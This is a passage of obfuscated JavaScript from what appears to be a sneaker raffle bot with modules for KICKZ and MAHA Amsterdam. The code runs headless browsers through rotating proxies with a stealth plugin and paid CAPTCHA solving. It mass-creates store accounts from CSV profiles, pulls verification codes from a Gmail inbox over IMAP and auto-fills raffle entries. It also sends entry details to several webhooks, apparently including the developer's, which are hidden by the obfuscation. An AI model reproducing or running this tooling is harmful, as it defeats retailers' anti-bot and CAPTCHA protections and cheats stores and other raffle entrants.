                            var _0xf1e472 = Math['round'](Math['random']() * (_0x3be672['length'] - 0x2));
                            await _0x47cb41['select']('#shoesize', _0x3be672[_0xf1e472 + 0x1]), await _0x63444f(0x3e8);
                        } else {
                            const _0x4b0c46 = await _0x47cb41['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3415b4 => {
                                return _0x3415b4['map'](_0x1555de => _0x1555de['innerText']);
                            }), _0xfcf176 = await _0x47cb41['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x21722b => {
                                return _0x21722b['map'](_0x4b3e43 => _0x4b3e43['value']);
                            });
                            var _0x3503bb = _0x3db933[_0x29828d]['Size'];
                            for (var _0x10aac4 = 0x1; _0x10aac4 < _0xfcf176['length']; _0x10aac4++) {
                                var _0x14cfb6 = _0x4b0c46[_0x10aac4]['split']('\x20')[0x0];
                                if (_0x14cfb6 == _0x3503bb) {
                                    await _0x47cb41['select']('#shoesize', _0xfcf176[_0x10aac4]);
                                    break;
                                } else {
                                    if (_0x10aac4 + 0x1 == _0xfcf176['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x47cb41['waitForSelector']('#comp_address1'), await _0x47cb41['type']('#comp_address1', _0x3db933[_0x29828d]['Address1'] + '\x20' + _0x3db933[_0x29828d]['HouseNumber']), await _0x47cb41['waitForSelector']('#comp_address2'), await _0x47cb41['type']('#comp_address2', '' + _0x3db933[_0x29828d]['Address2']), await _0x47cb41['waitForSelector']('#comp_address2'), await _0x47cb41['type']('#comp_address3', '' + _0x3db933[_0x29828d]['City']), await _0x47cb41['waitForSelector']('#comp_postcode'), await _0x47cb41['type']('#comp_postcode', '' + _0x3db933[_0x29828d]['Zip']), console['log'](_0x46d913() + '\x20[' + _0x48f539['name'] + ']\x20Task\x20' + (_0x29828d + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x63444f(0x4b0), await _0x47cb41['click']('label#emailhold'), await _0x63444f(0x5dc), await _0x47cb41['click']('#preauth_tandc_email\x20>\x20label'), await _0x63444f(0x5dc), await _0x47cb41['click']('#submit'), await _0x47cb41['waitForSelector']('#paymentWrap'), console['log'](_0x46d913() + '\x20[' + _0x48f539['name'] + ']\x20Task\x20' + (_0x29828d + 0x1) + '\x20:\x20' + _0x580fd6['blue']('Awaiting\x20Paypal\x20Payment')), _0x4dc800['on']('targetcreated', async _0x4d86a1 => {
                            if (_0x4d86a1['type']() === 'page') {
                                const _0x419c0a = await _0x4d86a1['page']();
                                async function _0x4105b3() {
                                    try {
                                        await _0x47cb41['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x3d140c = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x445811() {
                                    try {
                                        await _0x47cb41['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x2818ac = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x445811(), _0x4105b3(), await _0x63444f(0x493e0);
                            }
                        });
                        async function _0xf7f220() {
                            for (let _0x27726c = 0x0; _0x27726c < 0x12c; _0x27726c++) {
                                if (_0x2818ac == !![]) {
                                    _0x3e1c85 = 'no', _0xa2d2c6(_0x3db933[_0x29828d], _0x48f539), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x48f539['name'] + ']\x20Task\x20' + (_0x29828d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '')
                                        try {
                                            await _0x584f8b(_0xb4964b['webhook'], _0xce8de8['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0xce8de8['succesDEVMSG']), await _0x63444f(0xc8);
                                    try {
                                        await _0x584f8b(_0x3501b6, _0xce8de8['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x3d140c)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x63444f(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x63444f(0xbb8), await _0x47cb41['click']('.zoid-outlet'), await _0x63444f(0x7d0), await _0xf7f220();
                    } catch (_0x216ec0) {
                        console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x48f539['name'] + ']\x20Task\x20' + (_0x29828d + 0x1) + '\x20:\x20' + _0x216ec0)), _0x4cc957 = '' + _0x216ec0;
                        var _0x1d7821 = await _0x4d9326(_0x3db933[_0x29828d], _0x48f539, 'dev', !![], _0x4cc957);
                        _0xce8de8['errorDEV'] = { 'embeds': [_0x1d7821] }, _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0xce8de8['errorDEV']), await _0x584f8b(_0x437fba, _0xce8de8['errorDEV']);
                    } finally {
                        _0x4dc800 && _0x4dc800['close']();
                        if (_0x3e1c85 == 'yes' && _0x308bb6 != 0x5 && _0x4cc957 != 'Size\x20Not\x20Found') {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x48f539['name'] + ']\x20Task\x20' + (_0x29828d + 0x1) + '\x20:\x20Retrying')), _0x29828d = _0x29828d - 0x1, _0x308bb6 = _0x308bb6 + 0x1;
                            continue;
                        }
                        _0x3e1c85 == 'yes' && _0x308bb6 >= 0x5 && (_0x1d0bc0(afew[_0x29828d], _0x48f539), _0x3e1c85 = 'no', _0x308bb6 = 0x0), console['log']('Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x29212f, _0x5e4138, _0x5e6bbf) {
                    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0xb4964b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x241cfd = 0x0; _0x241cfd < _0x5e4138['length']; _0x241cfd++) {
                        const _0x1d6a69 = 'https://www.kickz.com/login';
                        if (_0x42c883 != 'yes')
                            var _0x42c883 = '', _0x2123a2 = 0x0;
                        _0x40199d(_0x29212f['name'] + '\x20Task\x20' + (_0x241cfd + 0x1) + '\x20/\x20' + _0x5e4138['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec), await _0x1713f8(_0x5e4138, _0x241cfd);
                        var _0x2d8c9e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1a887b
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0xb4964b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3b25e6
                                }
                            ]
                        }];
                        const _0x590d9e = { 'embeds': _0x2d8c9e };
                        var _0xf8c7ce = await _0x4d9326(_0x5e4138[_0x241cfd], _0x29212f, 'acc', ![]);
                        const _0x388fac = { 'succesDEVMSG': { 'embeds': [_0xf8c7ce] } };
                        if (_0x5e4138[_0x241cfd]['Email'] == '' || _0x5e4138[_0x241cfd]['FirstName'] == '' || _0x5e4138[_0x241cfd]['LastName'] == '') {
                            console['log'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5e4138[_0x241cfd]['Password'] == '' && (_0x5e4138[_0x241cfd]['Password'] = 'JRaffles23!');
                        if (_0xb4964b['useRandomProxy'] = ![])
                            var _0x37f042 = _0x5e6bbf[_0x241cfd]['split'](':');
                        else
                            var _0x52f773 = Math['round'](Math['random']() * (_0x5e6bbf['length'] - 0x1)), _0x37f042 = _0x5e6bbf[_0x52f773]['split'](':');
                        const _0x59332c = await _0x5e99b4['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x37f042[0x0] + ':' + _0x37f042[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0xc4a17e = await _0x59332c['newPage']();
                            await _0xc4a17e['authenticate']({
                                'username': '' + _0x37f042[0x2],
                                'password': '' + _0x37f042[0x3]
                            }), console['log'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Getting\x20Session'), await _0xc4a17e['setRequestInterception'](!![]), _0xc4a17e['on']('request', _0x2764b9 => {
                                _0x2764b9['resourceType']() === 'image' || _0x2764b9['resourceType']() === 'font' || _0x2764b9['resourceType']() === 'media' ? _0x2764b9['abort']() : _0x2764b9['continue']();
                            }), await _0xc4a17e['goto'](_0x1d6a69), await _0x63444f(0xbb8), console['log'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Starting\x20Registration'), await _0xc4a17e['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xc4a17e['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xc4a17e['waitForSelector']('#button-register'), await _0x63444f(0x7d0), await _0xc4a17e['evaluate'](() => {
                                const _0x548932 = document['querySelector']('#button-register');
                                _0x548932['click']();
                            }), console['log'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x63444f(0x1388), await _0xc4a17e['waitForSelector']('#customer_salutation'), await _0xc4a17e['select']('#customer_salutation', 'mr'), await _0x63444f(0x7d0), await _0xc4a17e['waitForSelector']('#customer_firstname'), await _0xc4a17e['type']('#customer_firstname', '' + _0x5e4138[_0x241cfd]['FirstName']), await _0x63444f(0x352), await _0xc4a17e['waitForSelector']('#customer_lastname'), await _0xc4a17e['type']('#customer_lastname', '' + _0x5e4138[_0x241cfd]['LastName']), await _0x63444f(0x352), await _0xc4a17e['type']('#email-input', '' + _0x5e4138[_0x241cfd]['Email']), await _0x63444f(0x352), await _0xc4a17e['type']('#email-confirm-input', '' + _0x5e4138[_0x241cfd]['Email']), await _0x63444f(0x352), await _0xc4a17e['type']('#register-password', '' + _0x5e4138[_0x241cfd]['Password']), await _0x63444f(0x352), await _0xc4a17e['type']('#password-confirm', '' + _0x5e4138[_0x241cfd]['Password']), await _0x63444f(0x352), console['log'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0xc4a17e['click']('#consent'), await _0x63444f(0x1f4);
                            const _0x5a53ea = await _0xc4a17e['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x5a53ea) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0xc4a17e['click']('#buttonRegister');
                            try {
                                await _0xc4a17e['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x5e4138[_0x241cfd]['Email']), await _0x63444f(0x4b0);
                            async function _0x5b5527() {
                                var _0x4e89c1, _0x29214f = ![];
                                for (var _0x93bf59 = 0x0; _0x93bf59 < 0x18; _0x93bf59++) {
                                    async function _0x5cc444() {
                                        var _0x12dc32 = new _0x2021ac({
                                            'user': _0xb4964b['masterMail'],
                                            'password': _0xb4964b['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x277062(_0x4cfc3b) {
                                            _0x12dc32['openBox']('INBOX', ![], _0x4cfc3b);
                                        }
                                        _0x12dc32['once']('ready', function () {
                                            console['log'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x277062(function (_0x329b7d, _0x1ca011) {
                                                console['log'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x329b7d)
                                                    throw _0x329b7d;
                                                _0x12dc32['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x538e2c, _0x3e5e20) {
                                                    if (!_0x3e5e20 || !_0x3e5e20['length'])
                                                        console['log'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x12dc32['end']();
                                                    else {
                                                        var _0x4d59d5 = _0x12dc32['seq']['fetch'](_0x3e5e20, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x4d59d5['on']('message', function (_0x486e46, _0x332619) {
                                                            var _0x2d41a9 = '(#' + _0x332619 + ')\x20';
                                                            _0x486e46['on']('body', function (_0x413f2b, _0x1f929d) {
                                                                _0x22cc54(_0x413f2b, (_0x56cd05, _0x11f465) => {
                                                                    if (_0x11f465['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x931b46 = _0x11f465['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x1259d4 = _0x931b46[0x1]['split']('<')[0x0];
                                                                        _0x4e89c1 = _0x1259d4;
                                                                    }
                                                                });
                                                            }), _0x486e46['once']('end', function () {
                                                            });
                                                        }), _0x4d59d5['once']('error', function (_0x1c0dfe) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x4d59d5['once']('end', function () {
                                                            _0x12dc32['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x12dc32['once']('error', function (_0xfefb26) {
                                            console['log'](_0x580fd6['red'](_0xfefb26['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x29214f = !![];
                                        }), _0x12dc32['once']('end', async function () {
                                        }), _0x12dc32['connect']();
                                    }
                                    _0x5cc444(), await _0x63444f(0x1388);
                                    if (_0x4e89c1)
                                        return _0x4e89c1;
                                    if (_0x29214f)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x93bf59 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x5b5527(), _0x63444f(0x320), console['log'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Verifying..'), await _0xc4a17e['type']('#verificationCode', code), await _0x63444f(0x1f4), await _0xc4a17e['click']('#buttonVerify'), await _0x63444f(0x190), await _0xc4a17e['click']('#buttonVerify'), await _0x63444f(0x3e8);
                            try {
                                await _0xc4a17e['waitForSelector']('div.b-user_greeting'), _0x42c883 = 'no', console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Account\x20' + _0x5e4138[_0x241cfd]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x442555['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x5e4138[_0x241cfd]['Email'] + ',' + _0x5e4138[_0x241cfd]['Password'] + ','), console['log'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Account\x20' + _0x5e4138[_0x241cfd]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x388fac['succesDEVMSG']);
                                } catch {
                                }
                                await _0x584f8b(_0x214943, _0x388fac['succesDEVMSG']);
                            } catch {
                                _0x42c883 = 'no', console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x437652) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20' + _0x437652)), _0x2d8c9e[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x2d8c9e[0x0]['description'] = '' + _0x437652, await _0x584f8b(_0x437fba, _0x590d9e), _0x42c883 = 'yes';
                        } finally {
                            _0x59332c && _0x59332c['close']();
                            if (_0x42c883 == 'yes' && _0x2123a2 != 0x5) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x29212f['name'] + ']\x20Task\x20' + (_0x241cfd + 0x1) + '\x20:\x20Retrying')), _0x241cfd = _0x241cfd - 0x1, _0x2123a2 = _0x2123a2 + 0x1;
                                continue;
                            }
                            _0x42c883 == 'yes' && _0x2123a2 >= 0x5 && (_0x1d0bc0(_0x5e4138[_0x241cfd], _0x29212f), _0x42c883 = 'no', _0x2123a2 = 0x0), console['log']('Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x164f98, _0x4d7d63, _0x1f45c0) {
                    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0xb4964b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x19ca95 = 0x0; _0x19ca95 < _0x4d7d63['length']; _0x19ca95++) {
                        var _0x3b05e5;
                        if (_0x13eac7 != 'yes')
                            var _0x13eac7 = '', _0x34728e = 0x0;
                        _0x40199d(_0x164f98['name'] + '\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20/\x20' + _0x4d7d63['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec);
                        var _0x1d8e6e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1a887b
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x4d7d63[_0x19ca95]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x4d7d63[_0x19ca95]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0xb4964b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3b25e6
                                }
                            ]
                        }], _0x3b21f1 = await _0x4d9326(_0x4d7d63[_0x19ca95], _0x164f98, 'dev', ![]), _0x2f9141 = await _0x4d9326(_0x4d7d63[_0x19ca95], _0x164f98, 'pub', ![]);
                        const _0x4cb2ab = {
                            'succesDEVMSG': { 'embeds': [_0x3b21f1] },
                            'succesPUBMSG': { 'embeds': [_0x2f9141] }
                        };
                        await _0x1713f8(_0x4d7d63, _0x19ca95);
                        if (_0x4d7d63[_0x19ca95]['Email'] == '' || _0x4d7d63[_0x19ca95]['Password'] == '' || _0x4d7d63[_0x19ca95]['FirstName'] == '' || _0x4d7d63[_0x19ca95]['LastName'] == '') {
                            console['log'](_0x46d913() + '\x20[' + _0x164f98['name'] + ']\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0xb4964b['useRandomProxy'] = ![])
                            var _0x1eb292 = _0x1f45c0[_0x19ca95]['split'](':');
                        else
                            var _0x487a7e = Math['round'](Math['random']() * (_0x1f45c0['length'] - 0x1)), _0x1eb292 = _0x1f45c0[_0x487a7e]['split'](':');
                        const _0x5e6ee9 = await _0x5e99b4['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x1eb292[0x0] + ':' + _0x1eb292[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x33ceef = await _0x5e6ee9['newPage']();
                            await _0x33ceef['authenticate']({
                                'username': '' + _0x1eb292[0x2],
                                'password': '' + _0x1eb292[0x3]
                            }), console['log'](_0x46d913() + '\x20[' + _0x164f98['name'] + ']\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x33ceef['setRequestInterception'](!![]), _0x33ceef['on']('request', _0x4bf88a => {
                                _0x4bf88a['resourceType']() === 'image' || _0x4bf88a['resourceType']() === 'font' || _0x4bf88a['resourceType']() === 'media' ? _0x4bf88a['abort']() : _0x4bf88a['continue']();
                            }), await _0x33ceef['goto']('' + _0x4d7d63[_0x19ca95]['Url'], { 'waitUntil': 'networkidle2' }), await _0x63444f(0x12c);
                            try {
                                await _0x33ceef['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x33ceef['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x46d913() + '\x20[' + _0x164f98['name'] + ']\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20:\x20Logging\x20in'), await _0x33ceef['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x33ceef['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x33ceef['waitForSelector']('#username'), await _0x33ceef['type']('#username', _0x4d7d63[_0x19ca95]['Email']), await _0x33ceef['waitForSelector']('#password'), await _0x33ceef['type']('#password', _0x4d7d63[_0x19ca95]['Password']), await _0x63444f(0x190), await _0x33ceef['click']('#buttonSubmit'), await _0x33ceef['waitForSelector']('div.b-user_greeting'), console['log'](_0x46d913() + '\x20[' + _0x164f98['name'] + ']\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x63444f(0x1f4), await _0x33ceef['goto']('' + _0x4d7d63[_0x19ca95]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x46d913() + '\x20[' + _0x164f98['name'] + ']\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x4d7d63[_0x19ca95]['Size']);
                            let _0x520125 = _0x4d7d63[_0x19ca95]['Size']['replace']('.5', '\x201/2');
                            await _0x33ceef['click']('button[title=\x22' + _0x520125 + '\x22]'), await _0x63444f(0x1f4);
                            try {
                                await _0x33ceef['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x63444f(0x12c), console['log'](_0x46d913() + '\x20[' + _0x164f98['name'] + ']\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x33ceef['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x63444f(0x12c), await _0x33ceef['type']('#dwfrm_raffle_addressFields_firstName', _0x4d7d63[_0x19ca95]['FirstName']), await _0x63444f(0x12c), await _0x33ceef['type']('#dwfrm_raffle_addressFields_lastName', _0x4d7d63[_0x19ca95]['LastName']), await _0x63444f(0x12c), await _0x33ceef['select']('#dwfrm_raffle_addressFields_country', _0x4d7d63[_0x19ca95]['Country']), await _0x63444f(0x12c), await _0x33ceef['type']('#dwfrm_raffle_addressFields_city', _0x4d7d63[_0x19ca95]['City']), await _0x63444f(0x12c);
                            _0x4d7d63[_0x19ca95]['Postcode'] == undefined && (_0x4d7d63[_0x19ca95]['Postcode'] = _0x4d7d63[_0x19ca95]['Zip']);
                            await _0x33ceef['type']('#dwfrm_raffle_addressFields_postalCode', _0x4d7d63[_0x19ca95]['Postcode']), await _0x63444f(0x12c), await _0x33ceef['type']('#dwfrm_raffle_addressFields_address1', _0x4d7d63[_0x19ca95]['Address1']), await _0x63444f(0x12c), await _0x33ceef['type']('#dwfrm_raffle_addressFields_address2', _0x4d7d63[_0x19ca95]['HouseNumber']), await _0x63444f(0x12c), await _0x33ceef['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x4d7d63[_0x19ca95]['Address2']), await _0x63444f(0x12c), await _0x33ceef['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x63444f(0x12c), await _0x33ceef['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x4d7d63[_0x19ca95]['Follower']), await _0x63444f(0x1f4), await _0x33ceef['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x63444f(0x1f4), console['log'](_0x46d913() + '\x20[' + _0x164f98['name'] + ']\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20:\x20' + _0x580fd6['blue']('Awaiting\x20Paypal\x20Payment')), await _0x33ceef['click']('.b-paypal_button');
                            try {
                                await _0x33ceef['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x13eac7 = 'no', _0xa2d2c6(_0x4d7d63[_0x19ca95], _0x164f98), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x164f98['name'] + ']\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x4cb2ab['succesDEVMSG']), await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x4cb2ab['succesDEVMSG']), await _0x63444f(0xc8), await _0x584f8b(_0x3501b6, _0x4cb2ab['succesPUBMSG']);
                            } catch (_0x156fef) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x164f98['name'] + ']\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x156fef)), _0x3b05e5 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x156fef;
                                var _0x12c882 = await _0x4d9326(_0x4d7d63[_0x19ca95], _0x164f98, 'dev', !![], _0x3b05e5);
                                _0x4cb2ab['errorDEV'] = { 'embeds': [_0x12c882] }, _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x4cb2ab['errorDEV']), await _0x584f8b(_0x437fba, _0x4cb2ab['errorDEV']);
                            }
                        } catch (_0x5609d4) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x164f98['name'] + ']\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20:\x20' + _0x5609d4)), _0x3b05e5 = '' + _0x5609d4;
                            var _0x12c882 = await _0x4d9326(_0x4d7d63[_0x19ca95], _0x164f98, 'dev', !![], _0x3b05e5);
                            _0x4cb2ab['errorDEV'] = { 'embeds': [_0x12c882] }, _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x4cb2ab['errorDEV']), await _0x584f8b(_0x437fba, _0x4cb2ab['errorDEV']), _0x13eac7 = 'yes';
                        } finally {
                            _0x5e6ee9 && _0x5e6ee9['close']();
                            if (_0x13eac7 == 'yes' && _0x34728e != 0x5) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x164f98['name'] + ']\x20Task\x20' + (_0x19ca95 + 0x1) + '\x20:\x20Retrying')), _0x19ca95 = _0x19ca95 - 0x1, _0x34728e = _0x34728e + 0x1;
                                continue;
                            }
                            _0x13eac7 == 'yes' && _0x34728e >= 0x5 && (_0x1d0bc0(_0x4d7d63[_0x19ca95], _0x164f98), _0x13eac7 = 'no', _0x34728e = 0x0), console['log']('Waiting\x20for\x20' + _0xb4964b['AfewDelay'] + '\x20ms'), await _0x63444f(_0xb4964b['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
